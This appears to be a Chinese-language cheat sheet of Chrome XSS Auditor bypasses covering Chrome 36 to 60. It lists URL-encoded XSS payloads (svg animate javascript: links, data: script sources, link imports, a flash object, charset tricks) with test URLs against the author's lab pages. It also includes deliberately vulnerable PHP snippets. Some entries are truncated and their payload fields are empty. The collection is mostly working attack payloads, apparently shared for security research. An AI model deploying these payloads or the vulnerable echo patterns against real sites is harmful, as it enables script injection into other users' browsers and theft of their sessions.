作者：[phith0n@长亭科技](https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html#bypass)
#### Universal Bypass 5
最新版 Chrome 60
context == null
test：
    http://mhz.pw/game/xss/xss.php?xss=%3c%62%72%3e%00%00%00%00%00%00%00%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
#### Bypass 4 （需交互的bypass）
chrome 60
    ?c=
    // or
    ?c=
test
    http://mhz.pw/game/xss/xss.php?xss=%3Csvg%3E%3Canimate%20href%3D%23x%20attributeName%3Dhref%20values%3D%26%23x3000%3Bjavascript%3Aalert%281%29%20%2F%3E%3Ca%20id%3Dx%3E%3Crect%20width%3D100%20height%3D100%20%2F%3E%3C%2Fa%3E
    http://mhz.pw/game/xss/xss.php?xss=%3Csvg%20width%3D10000px%20height%3D10000px%3E%3Ca%3E%3Crect%20width%3D10000px%20height%3D10000px%20z-index%3D9999999%20%2F%3E%3Canimate%20attributeName%3Dhref%20values%3Djavas%26%2399ript%3Aalert%281%29%3E
#### Bypass 3 via flash
只要支持flash的chrome版本（到Chrome 56），均可使用。
context == support flash
test
    http://mhz.pw/game/xss/xss.php?xss=%3Cobject%20allowscriptaccess=always%3E%20%3Cparam%20name=url%20value=http%3A%2F%2Fmhz.pw%2Fgame%2Fxss%2Falert.swf%3E
#### Universal Bypass 2
到Chrome 55/56可用， 无任何条件，只要输出在页面中即可执行代码。
context == null
    ?xss=
test
    http://mhz.pw/game/xss/xss.php?xss=%3Csvg%3E%3Cset%20href%3D%23script%20attributeName%3Dhref%20to%3Ddata%3A%2Calert(document.domain)%20%2F%3E%3Cscript%20id%3Dscript%20src%3Dfoo%3E%3C%2Fscript%3E
#### Universal Bypass 1
到Chrome 55/56可用，无任何条件，只要输出在页面中即可执行代码。
context == null
    ?xss={$_GET['html']} ";
test
    http://mhz.pw/game/xss/xss2.php?html=%3Cscript%3Ealert%28%29%3C/script
#### Chrome 44/45 + 属性中输出的情况
    https://code.google.com/p/chromium/issues/detail?id=526104
chrome45+ fixed
context:
      XSSAuditor bypass
        ">
payload：
    ">prompt(/XSS/);1%02 
test
    http://mhz.pw/game/xss/attr.php?xss=%22%3E%3Cscript%3Eprompt(%2FXSS%2F)%3B1%2502%3Cscript%3C%2Fscript%3E
#### 无charset Bypass
没有输出charset的情况下，可以通过制定字符集来绕过auditor。
老版的这个编码：ISO-2022-KR，可用 `onerror%0f=alert(1)`
bypass，但现在版本已经没用这个编码，所以该payload只适用于老版本chrome。
新版中，有这个编码：ISO-2022-JP，可以在关键处中加入 `%1B%28B`，会被省略。
context:
    `的情况
context:
    ">
payload
    xss="> 
test
    http://mhz.pw/game/xss/beforescript.php?xss=%22%3E%3Cscript%2Fsrc%3Ddata%3A%2Calert(document.domain)%2B%22
#### 双输出点的情况
context:
    "; 
    // Echo the value of parameter two 
    echo "This is text2:".$_GET['text2'].""; 
    ?> 
payload:
    http://xxx/chrome.php?text1= 
    http://xxx/chrome.php?text1=
test
    http://mhz.pw/game/xss/doubleout.php?text1=%3Cscript%3Ealert(/XSS/);void(%27&text2=%27)%3C/script%3E
#### Chrome 43 XSSAuditor bypass
大概2015-06-23以前的版本均可。
context==全部情况
payload:
    xss=/alert(document.domain)
test
    http://mhz.pw/game/xss/xss.php?xss=%3Csvg%3E%3Cscript%3E/%3C1/%3Ealert(document.domain)%3C/script%3E%3C/svg%3E
#### Chrome 36~40 link 导入html导致bypass
Fixed in Oct 10, 2014.（实际上15年初还存在）
    https://code.google.com/p/chromium/issues/detail?id=421166
    http://www.wooyun.org/bugs/wooyun-2010-090304
由于link导入外部html导致XSSAuditor绕过。
context==全部情况
payload
    xss=
test
    http://mhz.pw/game/xss/xss.php?xss=%3Clink%20rel%3Dimport%20href%3Dhttps%3A%2F%2Fauth.mhz.pw%2Fgame%2Fxss%2Flink.php%3E
#### 输出在script内字符串位置的情况
如果允许闭合字符串，直接闭合并写入javascript即可，如:
`http://mhz.pw/game/xss/scriptstr.php?xss=%27|alert(1)|%27`
但如果不能闭合单引号呢？如这个context
        all
        var a = '';
    123
payload
    alert(1)+&quot;";
    alert(1)+&apos;";
test
    http://mhz.pw/game/xss/scriptaddslashes.php?xss=%3C/script%3E%3Csvg%3E%3Cscript%3Ealert(1)%2b%26apos%3B
    http://mhz.pw/game/xss/scriptaddslashes.php?xss=%3C/script%3E%3Csvg%3E%3Cscript%3Ealert(1)//
#### 有可控上传点的通用Bypass
context：
网站域名下有可控的上传点，我可以上传一个.txt或.js等文件（只要不是媒体文件，其他文件均可，比如上传是黑名单验证的，可以随便写个后缀）。再引入script标签的src属性即可。
payload
    xss=%3Cscript%20src=/game/xss/upload/upload.txt%3E%3C/script%3E
test
    http://mhz.pw/game/xss/xss.php?xss=%3Cscript%20src=/game/xss/upload/upload.txt%3E%3C/script%3E
    http://mhz.pw/game/xss/xss.php?xss=%3Cscript%20src=/game/xss/upload/upload.ayu%3E%3C/script%3E
#### JSON Encode
context
payload
    ?x=
#### 存在字符替换的情况
当输出点在输出前存在字符（大部分字符，字符串什么的都可以）的替换，context如下：
    <?php
    echo str_replace('"', '&quote;', $_REQUEST['name']);
    echo str_replace('&', '&amp;', $_REQUEST['name']);
    echo str_replace('\\', '&bsol;', $_REQUEST['name']);
    echo str_replace('#', '&num;', $_REQUEST['name']);
    echo str_replace('xxxx', 'b', $_REQUEST['name']);
既可以在payload里带入该字符进行绕过auditor：
    xss=
test
    http://mhz.pw/game/xss/amps.php?name=zx%3Cscript%3E%27%26%27/alert(1)%3C/script%3Eczxc
* * *